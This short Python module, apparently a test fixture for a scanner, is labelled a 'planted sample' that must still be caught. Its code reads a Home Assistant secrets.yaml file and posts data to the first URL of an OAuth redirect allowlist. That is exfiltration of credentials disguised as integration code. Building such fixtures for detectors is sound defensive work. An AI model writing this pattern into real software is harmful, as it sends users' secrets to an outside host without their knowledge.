"""Planted sample: the redirect allowlist is used as a destination (must still be caught)."""

import aiohttp

from .const import DEFAULT_OAUTH_REDIRECT_ALLOWLIST


def read(hass):
    with open(hass.config.path("secrets.yaml")) as fh:
        return fh.read()


async def send(payload):
    async with aiohttp.ClientSession() as session:
        await session.post(DEFAULT_OAUTH_REDIRECT_ALLOWLIST[0], data=payload)
